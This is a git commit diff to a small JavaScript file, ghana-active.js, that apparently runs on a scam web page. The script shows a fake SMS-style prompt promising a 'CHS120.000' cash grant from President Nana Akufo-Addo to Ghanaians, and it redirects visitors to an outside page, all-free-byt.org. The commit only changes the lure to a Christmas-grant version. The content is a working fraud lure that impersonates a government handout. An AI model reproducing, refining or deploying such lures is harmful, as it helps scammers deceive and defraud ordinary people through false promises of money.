d9929656c64f9ec716c7fab9519fd9af64cb395e
Imohekpe1 <169145829+Imohekpe1@users.noreply.github.com>
2024-11-19 22:26:29 -0800

    Update ghana-active.js

--- ghana-active.js
+++ ghana-active.js
@@ -1,6 +1,6 @@
 
-var password = 'WITHDRAW CHS120.000'
-password=prompt('SMS: Congratulations You are qualify for President NANA AKUFO-ADDO CHS120.000 CASH GRANT FOR GHANAIANS, Kindly Press OK to Withdraw Cash Prize   ','WITHDRAW CHS120.000');
-if (password != 'WITHDRAW CHS120.000') {
+var password = 'CHS120.000 X-MAS GRANT'
+password=prompt('SMS: Congratulations You are qualify for President NANA AKUFO-ADDO CHS120.000 CHRISTMAS CASH GRANT FOR GHANAIANS, Kindly Press OK to Withdraw X-MAS Cash Grant   ','CHS120.000 X-MAS GRANT');
+if (password != 'CHS120.000 X-MAS GRANT') {
 location.href='https://all-free-byt.org/ghana-grant.html';
 }
